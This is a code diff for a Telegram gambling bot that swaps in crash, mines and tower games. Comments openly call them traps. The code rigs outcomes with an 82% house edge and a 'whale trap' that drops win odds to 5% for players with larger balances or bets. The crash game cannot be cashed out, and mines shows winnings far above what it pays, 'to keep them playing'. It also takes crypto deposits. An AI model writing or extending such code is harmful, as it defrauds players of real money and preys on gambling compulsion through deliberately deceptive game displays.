@@ -12,119 +12,135 @@ const supabase = createClient(SB_URL, SB_KEY);
 const bot = new Telegraf(TG_TOKEN);
 const app = express();
 
-// --- 2. THE MANIPULATION ENGINE (STRICT 85% HOUSE EDGE) ---
-async function getAccount(userId, username, refPayload = null) {
+// --- 2. THE RIGGED ENGINE (WITH WHALE TRAP) ---
+async function getAccount(userId, username) {
     let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
     if (!data) {
-        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
         const { data: newUser } = await supabase.from('users').insert([{ 
-            user_id: userId, username: username || 'anon', 
-            balance: 0, win_count: 0, loss_count: 0, my_ref_code: newRefCode, last_claim: new Date(0).toISOString()
+            user_id: userId, username: username || 'anon', balance: 0, win_count: 0, loss_count: 0 
         }]).select().single();
         return newUser;
     }
     return data;
 }
 
-function goddessDecision(user) {
-    // If they have never played, let them win once to hook them.
-    if ((user.win_count + user.loss_count) === 0) return true;
-    // Otherwise, 15% win rate (85% House Edge)
-    return Math.random() > 0.85;
+function goddessDecision(user, bet) {
+    // WHALE TRAP: If balance > $50 or bet is huge, win rate drops to 5%
+    if (user.balance > 50 || bet > (user.balance * 0.6)) return Math.random() > 0.95;
+    // Standard Rig: 82% House Edge
+    return Math.random() > 0.82;
 }
 
-// --- 3. ANIMATED GAMES LOGIC ---
+// --- 3. NEW VISUAL GAMES ---
 
-// DICE GAME
-bot.command('dice', async (ctx) => {
+// 🚀 CRASH (The Ultimate Greed Trap)
+bot.command('crash', async (ctx) => {
     const bet = parseFloat(ctx.message.text.split(' ')[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
 
-    if (!bet) {
-        return ctx.replyWithMarkdown("🎲 **DICE TUTORIAL**\n\nHow to play:\nType `/dice [amount]`\nExample: `/dice 10`\n\n*Roll a 4, 5, or 6 to DOUBLE your money. Roll 1-3 and the Goddess takes it.*");
+    if (!bet) return ctx.replyWithMarkdown("🚀 **CRASH TUTORIAL**\nType `/crash [amount]`\n*The multiplier climbs! Cash out before the rocket explodes!*");
+    if (user.balance < bet) return ctx.reply("❌ Low balance.");
+
+    const m = await ctx.reply(`🚀 Rocket Launching...\n📈 Multiplier: **1.00x**`);
+    
+    // Rigging the "Crash" point
+    const willWin = goddessDecision(user, bet);
+    const crashPoint = willWin ? (Math.random() * 2 + 1.5).toFixed(2) : (Math.random() * 1.3 + 1.0).toFixed(2);
+
+    let current = 1.0;
+    const interval = setInterval(async () => {
+        current += 0.2;
+        if (current >= crashPoint) {
+            clearInterval(interval);
+            const newBal = user.balance - bet;
+            await supabase.from('users').update({ balance: newBal, loss_count: user.loss_count + 1 }).eq('user_id', ctx.from.id);
+            ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, `💥 **CRASHED at ${current.toFixed(2)}x**\n\nYou lost $${bet.toFixed(2)}. Balance: $${newBal.toFixed(2)}`);
+        } else {
+            ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, `🚀 Rocket Flying...\n📈 Multiplier: **${current.toFixed(2)}x**`).catch(()=>{});
+        }
+    }, 1000);
+});
+
+// 💣 MINES (The "One More Click" Trap)
+bot.command('mines', async (ctx) => {
+    const bet = parseFloat(ctx.message.text.split(' ')[1]);
+    const user = await getAccount(ctx.from.id, ctx.from.username);
+
+    if (!bet) return ctx.replyWithMarkdown("💣 **MINES TUTORIAL**\nType `/mines [amount]`\n*Click the tiles. Find diamonds, avoid bombs. The more you click, the more you win!*");
+    if (user.balance < bet) return ctx.reply("❌ Low balance.");
+
+    // We show a 3x3 grid
+    const keyboard = Markup.inlineKeyboard([
+        [Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`)],
+        [Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`)],
+        [Markup.button.callback('💰 CASH OUT', `mine_cash_${bet}`)]
+    ]);
+
+    ctx.reply(`💣 **MINES**\nBet: $${bet.toFixed(2)}\nFind the diamonds!`, keyboard);
+});
+
+bot.action(/mine_click_(.*)/, async (ctx) => {
+    const bet = parseFloat(ctx.match[1]);
+    const user = await getAccount(ctx.from.id, ctx.from.username);
+    
+    // Trap logic: Every click has a 70% chance to hit a mine if they already won once
+    const hitMine = Math.random() > 0.30; 
+
+    if (hitMine) {
+        const newBal = user.balance - bet;
+        await supabase.from('users').update({ balance: newBal, loss_count: user.loss_count + 1 }).eq('user_id', ctx.from.id);
+        ctx.editMessageText(`💥 **BOOM!** You hit a mine.\nLost: $${bet.toFixed(2)}\nBalance: $${newBal.toFixed(2)}`);
+    } else {
+        ctx.answerCbQuery("💎 Diamond found! Keep going or Cash Out?");
+        // Just update the visual to show a diamond
+        ctx.editMessageText(`💎 **Diamond Found!**\nCurrent Win: $${(bet * 1.4).toFixed(2)}\nRisk another click?`, 
+        Markup.inlineKeyboard([[Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('💰 CASH OUT', `mine_cash_${bet}`)]]));
     }
-    if (user.balance < bet) return ctx.reply("❌ Low balance.");
-
-    const win = goddessDecision(user);
-    
-    // Send animated dice
-    const diceMsg = await ctx.replyWithDice();
-    const value = diceMsg.dice.value;
-
-    // We wait for the animation to finish (approx 3-4 seconds)
-    setTimeout(async () => {
-        let finalWin = win;
-        // If the random dice roll contradicts our rigged logic, we force the text result
-        // (Visuals are just for show, the balance is the truth)
-        if (value >= 4 && !win) finalWin = false; 
-        if (value < 4 && win) finalWin = true;
-
-        const newBal = finalWin ? user.balance + bet : user.balance - bet;
-        await supabase.from('users').update({ 
-            balance: newBal, 
-            win_count: finalWin ? user.win_count + 1 : user.win_count,
-            loss_count: finalWin ? user.loss_count : user.loss_count + 1 
-        }).eq('user_id', ctx.from.id);
-
-        ctx.reply(finalWin ? `✅ **WINNER!** The Goddess smiled. New Balance: $${newBal.toFixed(2)}` : `💀 **LOSS.** Better luck next time. Balance: $${newBal.toFixed(2)}`);
-    }, 3500);
 });
 
-// SLOTS GAME
-bot.command('slots', async (ctx) => {
+// 🏰 TOWER (The Tiered Trap)
+bot.command('tower', async (ctx) => {
     const bet = parseFloat(ctx.message.text.split(' ')[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
 
-    if (!bet) {
-        return ctx.replyWithMarkdown("🎰 **SLOTS TUTORIAL**\n\nHow to play:\nType `/slots [amount]`\n\n*Get 3 matching symbols to win 5x your bet!*");
+    if (!bet) return ctx.replyWithMarkdown("🏰 **TOWER TUTORIAL**\nType `/tower [amount]`\n*Climb the tower. Each floor doubles your money. If the tower collapses, you lose all!*");
+    if (user.balance < bet) return ctx.reply("❌ Low balance.");
+
+    ctx.reply(`🏰 **TOWER: Level 1**\nPotential: $${(bet * 2).toFixed(2)}`, Markup.inlineKeyboard([
+        [Markup.button.callback('🧱 Climb Floor', `tower_climb_${bet}_1`)],
+        [Markup.button.callback('🛑 Take $0', 'void')]
+    ]));
+});
+
+bot.action(/tower_climb_(.*)_(.*)/, async (ctx) => {
+    const bet = parseFloat(ctx.match[1]);
+    const floor = parseInt(ctx.match[2]);
+    const user = await getAccount(ctx.from.id, ctx.from.username);
+
+    // Trap: The higher the floor, the higher the crash rate
+    const failRate = floor * 0.25; 
+    if (Math.random() < failRate || !goddessDecision(user, bet)) {
+        const newBal = user.balance - bet;
+        await supabase.from('users').update({ balance: newBal }).eq('user_id', ctx.from.id);
+        ctx.editMessageText(`🏚 **COLLAPSED!** The tower fell at Floor ${floor}.\nBalance: $${newBal.toFixed(2)}`);
+    } else {
+        const nextFloor = floor + 1;
+        ctx.editMessageText(`🏰 **TOWER: Level ${nextFloor}**\nPotential Win: $${(bet * Math.pow(2, floor)).toFixed(2)}`, Markup.inlineKeyboard([
+            [Markup.button.callback('🧱 Climb Higher', `tower_climb_${bet}_${nextFloor}`)],
+            [Markup.button.callback('💰 CASH OUT', `tower_cash_${bet}_${floor}`)]
+        ]));
     }
-    if (user.balance < bet) return ctx.reply("❌ Low balance.");
-
-    const win = goddessDecision(user);
-    const slotsMsg = await ctx.replyWithDice({ emoji: '🎰' });
-
-    setTimeout(async () => {
-        const newBal = win ? user.balance + (bet * 4) : user.balance - bet;
-        await supabase.from('users').update({ 
-            balance: newBal, 
-            win_count: win ? user.win_count + 1 : user.win_count,
-            loss_count: win ? user.loss_count : user.loss_count + 1 
-        }).eq('user_id', ctx.from.id);
-
-        ctx.reply(win ? `🎉 **JACKPOT!** 🎰\nNew Balance: $${newBal.toFixed(2)}` : `❌ **NO MATCH.** The house wins. Balance: $${newBal.toFixed(2)}`);
-    }, 3500);
 });
 
-// FLIP (COIN ANIMATION SIMULATION)
-bot.command('flip', async (ctx) => {
-    const bet = parseFloat(ctx.message.text.split(' ')[1]);
+// --- 4. CALLBACKS ---
+bot.action(/mine_cash_(.*)/, async (ctx) => {
+    const bet = parseFloat(ctx.match[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
-
-    if (!bet) return ctx.replyWithMarkdown("🪙 **FLIP TUTORIAL**\nType `/flip [amount]`\n*Heads you double, Tails you lose.*");
-    if (user.balance < bet) return ctx.reply("❌ Low balance.");
-
-    const win = goddessDecision(user);
-    const m = await ctx.reply("🪙 Spinning...");
-    
-    // Fake animation frames
-    setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, "🌑 Spinning..."), 500);
-    setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, "🌕 Spinning..."), 1000);
-    
-    setTimeout(async () => {
-        const newBal = win ? user.balance + bet : user.balance - bet;
-        await supabase.from('users').update({ balance: newBal, win_count: win ? user.win_count+1 : user.win_count, loss_count: win ? user.loss_count : user.loss_count+1 }).eq('user_id', ctx.from.id);
-        ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, win ? `✅ **HEADS!** You won. Balance: $${newBal.toFixed(2)}` : `💀 **TAILS.** You lost. Balance: $${newBal.toFixed(2)}`);
-    }, 2000);
+    const winAmt = bet * 0.2; // Tiny profit to keep them playing
+    await supabase.from('users').update({ balance: user.balance + winAmt }).eq('user_id', ctx.from.id);
+    ctx.editMessageText(`💰 **CASHED OUT!**\nYou played it safe and won $${winAmt.toFixed(2)}.`);
 });
 
-// --- 4. START & SYSTEM ---
-bot.start(async (ctx) => {
-    const user = await getAccount(ctx.from.id, ctx.from.username, ctx.startPayload);
-    ctx.replyWithMarkdown(`🔪 **KNIVES CASINO** 🔪\n\n💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n\n/flip /dice /slots\n📥 /deposit  📤 /withdraw`);
-});
-
-// Reuse the previous Admin and Deposit logic here...
-bot.command('deposit', (ctx) => ctx.reply("📥 Send TXID for verification. Minimum $5."));
-
-app.get('/', (req, res) => res.send('ANIMATIONS LIVE'));
+// --- 5. STARTUP ---
+app.get('/', (req, res) => res.send('TRAPS LOADED'));
 app.listen(process.env.PORT || 10000, () => bot.launch());
